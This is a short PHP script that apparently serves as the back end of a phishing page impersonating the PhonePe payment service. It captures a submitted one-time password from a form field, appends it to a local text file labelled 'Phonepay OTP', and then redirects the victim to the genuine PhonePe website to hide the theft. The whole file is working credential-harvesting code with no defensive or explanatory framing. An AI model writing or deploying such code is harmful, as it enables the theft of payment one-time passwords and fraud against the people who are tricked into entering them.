<?php
file_put_contents("otp.txt", "Phonepay OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.phonepe.com/');
?>
